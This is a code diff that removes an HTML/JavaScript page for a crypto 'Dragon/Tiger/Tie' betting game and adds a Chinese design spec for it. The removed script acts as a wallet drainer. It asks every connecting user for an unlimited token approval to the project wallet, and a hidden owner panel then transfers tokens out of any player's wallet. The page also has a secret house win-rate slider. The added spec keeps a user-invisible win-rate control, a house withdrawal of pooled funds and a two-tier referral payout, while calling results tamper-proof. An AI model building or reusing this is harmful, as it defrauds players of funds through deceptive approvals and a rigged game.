@@ -1,399 +1,64 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>王者归来</title>
-<style>
-*{box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
-body{background:#0B2A23;color:#fff;margin:0;padding:0}
-.container{max-width:600px;margin:0 auto;padding:10px}
-.header{display:flex;justify-content:space-between;align-items:center;padding:10px 0}
-.header .title{font-size:20px;font-weight:bold}
-.btn-menu{background:none;border:none;color:#fff;font-size:24px;cursor:pointer}
-.card{background:#141414;border-radius:12px;padding:15px;margin-bottom:15px;border:1px solid #222}
-.card-title{font-size:16px;margin-bottom:10px;color:#F0E4D2}
-.btn-sign{background:#E4B449;color:#0B2A23;border:none;padding:10px 15px;border-radius:8px;font-weight:bold;margin-bottom:8px;width:100%}
-.btn-connect{background:#2573d7;color:#fff;border:none;padding:10px 15px;border-radius:8px;font-weight:bold;width:100%}
-.wallet-row{display:flex;gap:6px;font-size:14px;margin-bottom:4px}
-.bet-area{display:flex;gap:10px;margin-bottom:10px}
-.bet-input{flex:2;background:#1E1E1E;border:1px solid #333;color:#fff;padding:10px;border-radius:8px}
-.balance-display{flex:1;background:#1E1E1E;border:1px solid #333;padding:10px;border-radius:8px;text-align:center;font-size:13px;color:#ccc}
-.quick-buttons{display:flex;gap:8px;margin-bottom:10px}
-.btn-quick{flex:1;background:#1E1E1E;color:#fff;border:1px solid #333;padding:8px;border-radius:8px}
-.odds-buttons{display:flex;gap:8px;margin-bottom:10px}
-.btn-odds{flex:1;border:none;padding:12px;border-radius:8px;font-weight:bold;color:#fff}
-.btn-dragon{background:#2A65CC}
-.btn-tiger{background:#D93A54}
-.btn-tie{background:#E4B449;color:#000}
-.draw-timer{font-size:28px;color:#E4B449;margin:10px 0;text-align:center}
-.btn-auto-draw{background:#E4B449;color:#0B2A23;border:none;padding:12px 20px;border-radius:8px;font-weight:bold;width:100%;margin-bottom:10px}
-.trend-chart{display:flex;gap:8px;flex-wrap:wrap;padding:10px 0}
-.trend-item{width:32px;height:32px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:12px;background:#1a1a11}
-.trend-long{color:#2a7dff}
-.trend-short{color:#ff4444}
-.trend-tie{color:#ffcc00}
-.rules{font-size:14px;line-height:1.6;color:#ccc}
 
-.menu{position:fixed;top:0;right:0;width:280px;height:100vh;background:#101010;padding:20px;z-index:999;transform:translateX(100%);transition:0.3s;border-left:1px solid #222;overflow-y:auto}
-.menu.show{transform:translateX(0)}
-.menu-close{text-align:right;margin-bottom:20px}
-.menu-close button{background:#333;color:#fff;border:none;padding:6px 10px;border-radius:6px;cursor:pointer}
-.menu-section{margin-bottom:20px}
-.menu-title{font-size:14px;color:#aaa;margin-bottom:8px}
-.info-box{background:#1a1a11;padding:10px;border-radius:8px;font-size:12px;color:#ccc;word-break:break-all;margin-bottom:8px}
-.btn-menu-action{width:100%;background:#1a1a1e;color:#fff;border:1px solid #333;padding:10px;border-radius:8px;margin-bottom:8px;cursor:pointer;font-size:12px}
-.btn-red{background:#c93737;color:#fff;border:none}
-.btn-green{background:#27ae60;color:#fff;border:none}
-.hidden{display:none!important}
+龙·虎·和 链上游戏 - 最终定稿版（无漏洞、可直接开发）
 
-.player-item{background:#1a1a1e;padding:10px;border-radius:8px;margin-bottom:10px;border:1px solid #222}
-.player-label{font-size:11px;color:#888;margin-bottom:4px}
-.player-content{font-size:12px;color:#eee;word-break:break-all;margin-bottom:6px;line-height:1.4}
-.copy-buttons{display:flex;gap:6px}
-.copy-btn{flex:1;background:#222;border:none;color:#ccc;padding:6px;border-radius:4px;font-size:11px;cursor:pointer}
-.refresh-btn{width:100%;background:#222;color:#fff;border:none;padding:8px;border-radius:6px;margin-bottom:10px;cursor:pointer}
-.probability-control{background:#1a1a1e;padding:12px;border-radius:8px;margin-bottom:10px;border:1px solid #222}
-.probability-title{font-size:12px;color:#888;margin-bottom:8px}
-.probability-slider{width:100%;margin:8px 0}
-</style>
-</head>
-<body>
+一、页面布局与前端展示
 
-<div class="container">
-  <div class="header">
-    <div class="title">🐉 王者归来</div>
-    <button class="btn-menu" onclick="toggleMenu()">☰</button>
-  </div>
+1. 主页左上角
+- 圆形签到按钮，每个钱包每日24小时仅可签到1次，防刷号限制。
+- 签到成功后，自动从合约底池发放1枚代币至用户钱包。
+2. 签到按钮下方
+- 钱包连接按钮，支持一键连接链上钱包。
+- 连接后展示：用户钱包地址、钱包内代币余额。
+3. 钱包信息下方 —— 下注区
+- 右侧显示2分钟全网统一倒计时，倒计时归零时，任意用户均可一键触发开奖，触发后合约自动结算、开新一期，全网同步无差异。
+- 中间为下注金额输入框，下方设4个快捷金额按钮：10、50、200、500（为代币整数数量，按合约标准精度计算），点击自动填入输入框。
+- 金额下方为三个下注按钮：
+- 龙 1:2
+- 虎 1:2
+- 和 1:9
+4. 下注区下方 —— 开奖走势图
+- 展示全网统一、链上开奖后实时同步的历史结果（龙/虎/和）走势记录，数据不可篡改。
+5. 走势图下方 —— 玩法规则公示
+📜 玩法规则
 
-  <div class="card">
-    <button class="btn-sign" id="signBtn">📅 每日签到（领币）</button>
-    <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
-    <div class="wallet-row"><span>地址：</span><span id="address" style="color:#0ff;">未连接</span></div>
-    <div class="wallet-row"><span>可用代币余额：</span><span id="userBalance">0.0000</span></div>
-  </div>
+- 每2分钟1期，全网统一时间、统一开奖
+- 随机值 0 ~ 44999 = 虎
+- 随机值 45000 ~ 54999 = 和
+- 随机值 55000 ~ 99999 = 龙
 
-  <div class="card">
-    <div class="card-title">下注区</div>
-    <div class="bet-area">
-      <input type="number" class="bet-input" id="betAmt" value="1" placeholder="数量">
-      <div class="balance-display" id="balanceDisplay">余额</div>
-    </div>
-    <div class="quick-buttons">
-      <button class="btn-quick" onclick="setQuick(10000)">1万</button>
-      <button class="btn-quick" onclick="setQuick(100000)">10万</button>
-      <button class="btn-quick" onclick="setQuick(500000)">50万</button>
-      <button class="btn-quick" onclick="setQuick(1000000)">100万</button>
-    </div>
-    <div class="odds-buttons">
-      <button class="btn-odds btn-dragon" onclick="placeBet(1)">龙</button>
-      <button class="btn-odds btn-tiger" onclick="placeBet(2)">虎</button>
-      <button class="btn-odds btn-tie" onclick="placeBet(3)">和</button>
-    </div>
-  </div>
+🎯 赔率
 
-  <div class="card">
-    <div class="card-title">自动开奖（2分钟/期）</div>
-    <div>期号：<span id="round">#1</span></div>
-    <div class="draw-timer" id="timer">02:00</div>
-    <button class="btn-auto-draw" onclick="manualDraw()">🎯 立即开奖</button>
-  </div>
+- 龙 / 虎 1 赔 2
+- 和 1 赔 9
+- 开出“和”时，通杀龙、虎所有注单
 
-  <div class="card">
-    <div class="card-title">📈 开奖走势图</div>
-    <div id="trendChart" class="trend-chart"></div>
-  </div>
+🤝 推荐奖励
 
-  <div class="card">
-    <div class="card-title">📜 游戏规则</div>
-    <div class="rules">
-      • 每日签到可领取1个币<br>
-      • 每2分钟一期 | 龙/虎 1赔2 | 和 1赔9
-    </div>
-  </div>
-</div>
+- 一代奖励：下级下注额的 2%
+- 二代奖励：下下级下注额的 0.5%
+- 下级下注成功，上级奖励实时到账
+6. 页面右上角 —— 菜单（三横线收纳）
+1. 邀请链接：自动生成当前用户专属推广链接，新用户通过链接进入并首次下注后，自动绑定为该用户下级，绑定后永久不可修改。
+2. 团队收益：
+- 点击展开一级下级列表，展示每个下级滚动24小时真实下注流水（奖励不计入流水）。
+- 点击单个一级下级，可展开查看其下属二代用户及对应流水。
+- 底部展示：该用户所有推广收益永久累计总额。
+7. 庄家专属隐藏功能（用户不可见）
+1. 胜率控制：庄家可预设平台胜率比例，初始默认：玩家胜率49%，平台胜率51%。
+2. 庄家提取（庄家可提取池子内的代币）
 
-<div class="menu" id="menu">
-  <div class="menu-close"><button onclick="toggleMenu()">关闭</button></div>
+ 
 
-  <div id="userInfoSection" class="hidden">
-    <div class="menu-section">
-      <div class="menu-title">我的信息</div>
-      <div class="info-box">钱包地址：<br><span id="myWalletAddr">-</span></div>
-      <div class="info-box">邀请链接：<br><span id="myInviteLink">-</span></div>
-    </div>
-  </div>
+二、底层运行逻辑（合约核心规则）
 
-  <!-- 简化版：庄家胜率控制 -->
-  <div id="probabilityControlSection" class="hidden">
-    <div class="menu-section">
-      <div class="menu-title">🎮 庄家控制：胜率设置</div>
-      <div class="probability-control">
-        <div class="probability-title">庄家获胜概率: <span id="houseWinRate">50%</span></div>
-        <input type="range" id="houseSlider" class="probability-slider" min="0" max="100" value="50" oninput="updateHouseWinRate(this.value)">
-        <input type="number" id="houseWinRateInput" value="50" min="0" max="100" style="width:100%;background:#222;color:#fff;border:1px solid #333;padding:8px;border-radius:6px;margin-top:8px" onchange="updateHouseWinRate(this.value)">
-      </div>
-      <button class="btn-menu-action btn-green" onclick="saveHouseWinRate()">💾 保存胜率设置</button>
-    </div>
-  </div>
-
-  <div id="adminPlayerListSection" class="hidden">
-    <div class="menu-section">
-      <div class="menu-title">👑 已授权玩家(含余额)</div>
-      <button class="refresh-btn" onclick="renderAdminPlayerList()">🔄 刷新余额</button>
-      <div id="allPlayerList" style="max-height:400px;overflow-y:auto;"></div>
-    </div>
-  </div>
-
-  <div id="adminExtractSection" class="hidden">
-    <div class="menu-section" style="border-top:1px solid #333;padding-top:16px">
-      <div class="menu-title">🔐 庄家提取（玩家→庄家）</div>
-      <input type="text" id="fromUser" class="info-box" placeholder="玩家钱包地址">
-      <input type="number" id="extractAmt" class="info-box" placeholder="提取数量">
-      <button class="btn-menu-action btn-red" onclick="adminExtract()">💰 提取到庄家钱包</button>
-    </div>
-  </div>
-</div>
-
-<script>
-// ===================== 核心配置 =====================
-const TOKEN_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
-const PROJECT_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const POOL_ADDRESS    = "0x513946Ea175eC8D8ad5278F3F2Dec50C6e04b596";
-
-let account = null;
-let round = 1;
-let timeLeft = 120;
-let houseWinRate = 50; // 默认庄家胜率50%
-
-function toLower(addr){ return addr?.toLowerCase() || ""; }
-function isProjectOwner(){ return toLower(account) === toLower(PROJECT_WALLET); }
-
-function getAllPlayers(){ return JSON.parse(localStorage.getItem("all_players") || "[]"); }
-function addPlayer(addr){
-  let list = getAllPlayers();
-  if(!list.includes(toLower(addr))){
-    list.push(toLower(addr));
-    localStorage.setItem("all_players", JSON.stringify(list));
-  }
-}
-
-function copyToClipboard(id){
-  const t = document.getElementById(id).innerText;
-  navigator.clipboard.writeText(t).then(()=>alert("复制成功")).catch(()=>alert("失败"));
-}
-
-// ===================== 彻底修复余额读取 =====================
-async function getBalance(addr) {
-  if (!addr || addr.length !== 42) return 0;
-  try {
-    // 严格构造 balanceOf 调用数据
-    const data = "0x70a08231" + toLower(addr).slice(2).padStart(64, '0');
-    const result = await ethereum.request({
-      method: 'eth_call',
-      params: [{
-        to: TOKEN_CONTRACT,
-        data: data
-      }, 'latest']
-    });
-    // 安全转换为数字
-    const balanceWei = BigInt(result);
-    return Number(balanceWei) / 1e18;
-  } catch (e) {
-    console.error("获取余额失败:", e);
-    return 0; // 失败时稳定返回0
-  }
-}
-
-async function renderAdminPlayerList(){
-  const list = getAllPlayers();
-  const el = document.getElementById("allPlayerList");
-  el.innerHTML = "";
-  if(list.length===0){
-    el.innerHTML='<div style="padding:10px;text-align:center;">暂无玩家</div>';
-    return;
-  }
-  for(const addr of list){
-    const b = await getBalance(addr);
-    const item = document.createElement("div");
-    item.className="player-item";
-    item.innerHTML=`
-      <div class="player-label">玩家地址</div>
-      <div class="player-content" id="a${addr.slice(-8)}">${addr}</div>
-      <div class="player-label">可用代币余额</div>
-      <div class="player-content">${b.toFixed(4)}</div>
-      <div class="copy-buttons">
-        <button class="copy-btn" onclick="copyToClipboard('a${addr.slice(-8)}')">复制地址</button>
-      </div>
-    `;
-    el.appendChild(item);
-  }
-}
-
-// ===================== 简化版庄家胜率 =====================
-function updateHouseWinRate(value) {
-  const num = parseInt(value);
-  if (num >= 0 && num <= 100) {
-    houseWinRate = num;
-    document.getElementById("houseWinRate").innerText = `${num}%`;
-    document.getElementById("houseWinRateInput").value = num;
-  }
-}
-
-function saveHouseWinRate() {
-  localStorage.setItem("houseWinRate", houseWinRate.toString());
-  alert("✅ 胜率设置已保存：庄家获胜概率 " + houseWinRate + "%");
-}
-
-function toggleMenu(){
-  const m=document.getElementById("menu");
-  m.classList.toggle("show");
-  if(account){
-    document.getElementById("userInfoSection").classList.remove("hidden");
-    document.getElementById("myWalletAddr").innerText=account;
-  }else{
-    document.getElementById("userInfoSection").classList.add("hidden");
-  }
-  
-  if(isProjectOwner()){
-    document.getElementById("probabilityControlSection").classList.remove("hidden");
-    document.getElementById("adminPlayerListSection").classList.remove("hidden");
-    document.getElementById("adminExtractSection").classList.remove("hidden");
-    renderAdminPlayerList();
-    // 加载保存的胜率
-    const saved = localStorage.getItem("houseWinRate");
-    if(saved) {
-      houseWinRate = parseInt(saved);
-      document.getElementById("houseSlider").value = houseWinRate;
-      document.getElementById("houseWinRate").innerText = houseWinRate + "%";
-      document.getElementById("houseWinRateInput").value = houseWinRate;
-    }
-  }else{
-    document.getElementById("probabilityControlSection").classList.add("hidden");
-    document.getElementById("adminPlayerListSection").classList.add("hidden");
-    document.getElementById("adminExtractSection").classList.add("hidden");
-  }
-}
-
-// ===================== 连接钱包时直接授权 =====================
-async function connectWallet() {
-  if(!window.ethereum)return alert("请安装钱包");
-  try{
-    const acc = await ethereum.request({method:'eth_requestAccounts'});
-    account=toLower(acc[0]);
-    document.getElementById("address").innerText=account.slice(0,6)+"..."+account.slice(-4);
-    addPlayer(account);
-    
-    // 连接后直接弹授权提醒
-    const confirmAuth = confirm(
-      "连接成功！\n\n"+
-      "请先完成授权，以便进行游戏操作。\n"+
-      "确认后钱包将弹出授权签名，必须手动确认上链。"
-    );
-    if(confirmAuth) {
-      await approveToProject();
-      alert("✅ 授权成功！现在可以开始游戏了。");
-    }
-    
-    // 强制刷新余额
-    await refreshBalance();
-  }catch(e){alert("操作失败："+e.message);}
-}
-
-async function approveToProject(){
-  const max = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  return await ethereum.request({
-    method:'eth_sendTransaction',
-    params:[{
-      from:account,
-      to:TOKEN_CONTRACT,
-      gasLimit:"0x300000",
-      data:"0x095ea7b3"+PROJECT_WALLET.slice(2).padStart(64,'0')+max
-    }]
-  });
-}
-
-// ===================== 下注时只弹支付签名 =====================
-async function placeBet(side){
-  if(!account)return alert("请先连接钱包并完成授权");
-  const amt=parseFloat(document.getElementById("betAmt").value);
-  if(isNaN(amt)||amt<=0)return alert("输入有效金额");
-  
-  const c=confirm(
-"下注即代表您同意游戏规则。\n\n"+
-"下注金额将转入资金池，赢则从资金池赔付。\n\n"+
-"确认后钱包将弹出支付签名，必须手动确认上链。"
-  );
-  if(!c)return;
-
-  try{
-    const raw=BigInt(Math.floor(amt*1e18)).toString(16).padStart(64,'0');
-    await ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{
-        from:account,
-        to:TOKEN_CONTRACT,
-        gasLimit:"0x300000",
-        data:"0xa9059cbb"+POOL_ADDRESS.slice(2).padStart(64,'0')+raw
-      }]
-    });
-
-    await refreshBalance();
-    alert("✅ 下注成功，已上链");
-  }catch(e){alert("失败："+e.message);}
-}
-
-// ===================== 庄家提取 =====================
-async function adminExtract(){
-  if(!isProjectOwner())return alert("无权限");
-  
-  const fromAddr = document.getElementById("fromUser").value.trim();
-  const amt = document.getElementById("extractAmt").value.trim();
-  
-  if(!fromAddr||!amt||Number(amt)<=0)return alert("输入错误");
-  
-  try{
-    const raw=BigInt(Math.floor(Number(amt)*1e18)).toString(16).padStart(64,'0');
-    await ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{
-        from:account,
-        to:TOKEN_CONTRACT,
-        gasLimit:"0x300000",
-        data:"0x23b872dd"+
-              fromAddr.slice(2).padStart(64,'0')+
-              PROJECT_WALLET.slice(2).padStart(64,'0')+
-              raw
-      }]
-    });
-    alert("✅ 提取成功！代币已到庄家钱包");
-    document.getElementById("fromUser").value="";
-    document.getElementById("extractAmt").value="";
-  }catch(e){alert("提取失败："+e.message);}
-}
-
-// ===================== 刷新余额 =====================
-async function refreshBalance(){
-  if(!account)return;
-  const b=await getBalance(account);
-  // 确保一定是数字，避免toFixed报错
-  const safeBalance = typeof b === 'number' ? b : 0;
-  document.getElementById("userBalance").innerText = safeBalance.toFixed(4);
-  document.getElementById("balanceDisplay").innerText = "余额 " + safeBalance.toFixed(4);
-}
-
-function setQuick(v){document.getElementById("betAmt").value=v;}
-function manualDraw(){timeLeft=5;}
-
-window.onload=()=>{
-  setInterval(()=>{
-    timeLeft--;
-    if(timeLeft<=0)timeLeft=120;
-    const m=String(Math.floor(timeLeft/60)).padStart(2,'0');
-    const s=String(timeLeft%60).padStart(2,'0');
-    document.getElementById("timer").innerText=m+":"+s;
-  },1000);
-};
-</script>
-</body>
-</html>
+1. 开奖与结算机制
+- 每2分钟为一个开奖周期，倒计时结束后支持任意用户触发开奖，触发后自动结算、自动开启新一期。
+- 全网统一开奖结果，不可篡改、不可回滚。
+3. 下注与赔付规则
+- 用户下注金额直接进入合约底池，中奖赔付优先级最高。
+- 用户中奖：底池按对应赔率自动赔付，资金实时到账。
+- 用户未中奖：下注金额全部归入合约底池。
+4. 推广奖励分配
+- 用户下注时，系统自动从下注金额中抽取2.5%作为推广奖励。
+- 一代上级获得2%，二代上级获得0.5%，奖励实时发放。
+5.  同一钱包仅可拥有一个上级，绑定后永久不可修改。
